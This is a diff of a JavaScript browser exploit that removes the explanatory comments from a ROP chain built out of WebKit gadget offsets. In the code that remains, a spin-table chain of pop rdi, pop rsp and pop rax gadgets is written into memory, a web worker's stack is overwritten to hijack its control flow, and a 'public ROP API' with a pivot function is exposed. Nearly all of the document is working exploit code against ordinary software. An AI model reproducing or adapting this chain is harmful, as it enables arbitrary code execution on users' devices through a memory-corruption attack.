@@ -25,33 +25,27 @@ function find_worker()
 
 var spin_table = malloc(88);
 
-//set up rdi for returning
-write_ptr_at(spin_table, webkit_base+0x788fd); //pop rdi
-write_ptr_at(spin_table+8, spin_table-24); //32-56
+write_ptr_at(spin_table, webkit_base+0x788fd);
+write_ptr_at(spin_table+8, spin_table-24);
 
-//loop waiting for commands
-write_ptr_at(spin_table+16, webkit_base+0x5d293); //pop rsp
-write_ptr_at(spin_table+24, spin_table+16); //will overwrite with the jump target
+write_ptr_at(spin_table+16, webkit_base+0x5d293);
+write_ptr_at(spin_table+24, spin_table+16);
 
-//[rdi+56] is here on return
 write_ptr_at(spin_table+32, spin_table+40);
-write_ptr_at(spin_table+40, spin_table+24); //will be popped into rdi
+write_ptr_at(spin_table+40, spin_table+24);
 
-//restore the loop
-write_ptr_at(spin_table+48, webkit_base+0x84094); //pop rax
+write_ptr_at(spin_table+48, webkit_base+0x84094);
 write_ptr_at(spin_table+56, spin_table+16);
-write_ptr_at(spin_table+64, webkit_base+0x1254da); //mov [rdi], rax
+write_ptr_at(spin_table+64, webkit_base+0x1254da);
 
-//loop
-write_ptr_at(spin_table+72, webkit_base+0x5d293); //pop rsp
+write_ptr_at(spin_table+72, webkit_base+0x5d293);
 write_ptr_at(spin_table+80, spin_table);
 
-//hijack worker's control flow
 var worker_stack = find_worker();
-write_ptr_at(worker_stack+0x7fb88, webkit_base+0x5d293); //pop rsp
+write_ptr_at(worker_stack+0x7fb88, webkit_base+0x5d293);
 write_ptr_at(worker_stack+0x7fb90, spin_table);
 
-the_worker.postMessage(1); //the worker is now busy in pop rsp loop
+the_worker.postMessage(1);
 
 /* PUBLIC ROP API
 
@@ -74,7 +68,7 @@ These functions are the same, except that they never block.
 */
 function pivot_start(buf)
 {
-    //returns immediately
+
     write_ptr_at(buf, spin_table-24);
     write_ptr_at(spin_table+24, buf+8);
 }
